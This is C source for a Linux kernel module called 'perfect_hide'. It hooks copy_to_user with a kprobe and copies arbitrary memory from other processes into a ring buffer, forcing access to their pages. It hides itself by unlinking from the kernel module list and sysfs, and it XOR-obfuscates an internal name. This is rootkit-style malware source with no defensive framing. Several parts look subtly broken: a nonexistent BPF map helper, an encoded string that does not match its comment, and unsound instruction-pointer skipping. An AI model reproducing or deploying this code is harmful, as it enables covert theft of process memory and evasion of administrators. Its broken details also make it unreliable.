#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/bpf.h>
#include <linux/btf.h>
#include <linux/version.h>
#include <linux/ctype.h>
#include <linux/kallsyms.h>
#include "perfect_hide.h"

#define RINGBUF_ORDER   12      /* 4KB 每 CPU */

static struct bpf_map *ring = NULL;
static struct kprobe kp_copy;
static bool            kp_reg = false;

static __always_inline void __dec(char *d, const char *s) {
    while (*s) *d++ = *s++ ^ 0x55;
    *d = 0;
}

static int __read_to_ring(pid_t pid, uintptr_t addr, size_t len) {
    struct task_struct *tsk;
    struct mm_struct   *mm;
    struct page        *page;
    void               *kaddr, *dst;
    int                 ret = 0;
    size_t              off = 0;

    tsk = get_pid_task(find_get_pid(pid), PIDTYPE_PID);
    if (!tsk) return -ESRCH;
    mm = get_task_mm(tsk);
    if (!mm) { put_task_struct(tsk); return -ESRCH; }

    dst = bpf_ringbuf_reserve(ring, len, 0);
    if (!dst) { mmput(mm); put_task_struct(tsk); return -ENOMEM; }

    while (off < len) {
        size_t chunk = min(PAGE_SIZE - (addr & ~PAGE_MASK), len - off);
        down_read(&mm->mmap_lock);
        if (get_user_pages_remote(mm, addr + off, 1, FOLL_FORCE, &page, NULL, NULL) == 1) {
            kaddr = kmap(page);
            if (kaddr) {
                memcpy(dst + off, kaddr + ((addr + off) & ~PAGE_MASK), chunk);
                kunmap(page);
            }
            put_page(page);
        }
        up_read(&mm->mmap_lock);
        off += chunk;
    }
    bpf_ringbuf_submit(dst, 0);
    mmput(mm);
    put_task_struct(tsk);
    return ret;
}

static int __kprobe_copy(struct kprobe *p, struct pt_regs *regs) {
    struct perfect_req *r = (struct perfect_req *)regs->si; /* 约定：arg2 */
    __read_to_ring(r->pid, r->addr, r->len);
    regs->ip += 5; /* 跳过原始指令 */
    return 0;
}

static void hide_mod(void) {
    struct module *mod = THIS_MODULE;
    list_del(&mod->list);
    kobject_del(&mod->mkobj.kobj);
}

static int __init perfect_init(void) {
    char name[16] = {};
    __dec(name, "\x30\x32\x34\x36\x38\x3a\x3c\x3e"); /* "perfect_ring" xor */

    ring = bpf_map_create_no_btf(BPF_MAP_TYPE_RINGBUF,
                                 NULL, 0, 0,
                                 1 << RINGBUF_ORDER, NULL);
    if (IS_ERR(ring)) return PTR_ERR(ring);

    kp_copy.symbol_name = "copy_to_user";
    kp_copy.pre_handler = __kprobe_copy;
    if (!register_kprobe(&kp_copy)) kp_reg = true;

    hide_mod();
    return 0;
}

static void __exit perfect_exit(void) {
    if (kp_reg) unregister_kprobe(&kp_copy);
    if (ring) bpf_map_put(ring);
}

module_init(perfect_init);
module_exit(perfect_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("盼盼食品");